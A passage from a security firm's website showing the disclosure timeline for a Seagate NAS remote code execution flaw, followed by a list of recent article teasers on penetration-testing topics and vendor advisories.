* **27th October 2014**
  + Vendor responded via email, indicated work will be done without further communication.
  + Contacted vendor via email, requested updates on progress.
* **02nd November 2014**
  + Contacted vendor via email, requested confirmation of receipt of previous email.
  + Vendor responded, indicated communications will remain open.
* **09th November 2014**
  + MITRE responded with thorough email about prior work, and CVE allocation.
* **17th November 2014**
  + Contacted vendor via email, requested status update.
* **02nd December 2014**
  + Contacted vendor again via email, requested status update.
* **16th December 2014**
  + Contacted vendor again via Twitter, requested status update.
  + Vendor responded again, email content was the same as what was received 27th October 2014.
  + Contacted vendor via email, requested a more thorough update.
* **17th December 2014**
  + Vendor responded, requested confirmation of firmware version and asked if SSH is enabled.
* **19th December 2014**
  + Contacted vendor, informed them that use of SSH is irrelevant, as is the firmware version.
* **01st January 2015**
  + Contacted a number of vendor employees via Linked In.
* **09th January 2015**
  + Established contact with vendor employee responsible for security after interaction with a security professional on Twitter.
  + Established secure communications with employee using PGP.
* **10th January 2015**
  + Second vendor employee responded via Linked In, confirmed receipt of message and indicated knowledge of contact with previous employee. Previous employee will continue handling disclosure.
* **10th-16th January 2015**
  + Various communications back-and-forth with employee.
* **16th January 2015**
  + Disclosure documentation rewritten and sent with exploit to employee PGP-encrypted.
* **17th January 2015**
  + Employee confirmed receipt.
  + Beyond Binary revised public disclosure date to 1st March 2015.
* **21st January 2015**
  + Contacted employee, requested update.
* **23rd January 2015**
  + Employee responded, indicated successful exploitation using Proof of Concept code.
* **30th January 2015**
  + Employee proactively established contact and provided an update.
* **05th February 2015**
  + Employee again proactively established contact and provided an update.
* **17th February 2015**
  + Contacted employee to request status update for fixes and timeline for release.
* **26th February 2015**
  + Employee responded indicating there is no update to be shared.
* **01st March 2015**
  + Public disclosure.
* **April 2015 (day unknown)**
  + Seagate released [firmware version 2015.00322](http://www.seagate.com/au/en/support/downloads/item/business-nas-4bay-firmware-master-dl/) to address security issues ([release notes](http://www.seagate.com/au/en/support/external-hard-drives/network-storage/business-storage-4-bay-nas/4-bay-release-notes-00319/)).

## Recent

15 March 2018
#### [TTP: Domain Fronting with Metasploit and Meterpreter](/articles/domain-fronting-with-metasploit-and-meterpreter/)

Though it isn't widely known, support for Domain Fronting was added to Metasploit and Meterpreter by OJ Reeves in late 2017. Part of the reason that it's not common knowledge is the lack of documentation or discussion around how to use it. As a result, we decided to create this post so that users of Metasploit have a decent guide on how to configure and use Domain Fronting over HTTPS with a legitimate certificate.

[Metasploit](/tags/metasploit/)
[TTP](/tags/ttp/)

01 August 2017
#### [TTP: Bypassing Symantec Email Security.cloud (MessageLabs)](/articles/bypassing-messagelabs/)

During a recent Attack Simulation against a high-profile client, Beyond Binary faced off against Symantec Email Security.cloud (formerly MessageLabs) whilst conducting a variety of phishing campaigns. This was not the first time we had come up against cloud-based email security services, however our usual approaches to bypassing them didn't yield any fruit.

[MessageLabs](/tags/messagelabs/)
[TTP](/tags/ttp/)

10 March 2015
#### [Opinion: Seagate's Analysis is Incorrect](/articles/seagate-nas-rce-response-analysis/)

On March 1st 2015 Beyond Binary went public with an advisory that disclosed 0day flaws in Seagate Business Storage 2-Bay NAS devices. Days later, Seagate responded to the advisory through a number of channels:

* A direct email to Beyond Binary

[Opinion](/tags/opinion/)
[Seagate](/tags/seagate/)

1 March 2015
#### [Advisory: Seagate NAS Remote Code Execution Vulnerability](/articles/seagate-nas-rce/)

Seagate is a well-known vendor of hardware solutions, with products available worldwide. Its line of NAS products targeted at businesses is called Business Storage 2-Bay NAS. These can be found inside home and business networks, and in many cases they are publicly exposed.

[Advisory](/tags/advisory/)
[CVE](/tags/cve/)
[Exploit](/tags/exploit/)
[Seagate](/tags/seagate/)

4 February 2015
#### [Advisory: TeamCity Account Creation](/articles/teamcity-account-creation/)

TeamCity is a multi-platform continuous integration and build server product created by JetBrains. It is used by many development organisations to automate the build and deployment of software solutions as part of the development process. TeamCity is a very popular product and hence the number of installations, both public and private, is quite high.

[Advisory](/tags/advisory/)
[CVE](/tags/cve/)
[Exploit](/tags/exploit/)
[TeamCity](/tags/teamcity/)

[View older articles](/articles/)

[![](/images/beyond-binary-logo.png)](/)

[01 August 2017:](https://twitter.com/BeyondBase2/status/892362430881214464)Some cloud-based email protection mechanisms are useful. But don’t rely on them, they can and will be bypassed without much effort!

---

* [home](/)
* [about](/about/)
* [services](/services/)
* [articles](/articles/)
* [contact](/contact/)
* [media](/media/)

© Beyond Binary Pty Ltd - ABN 64 146 311 962


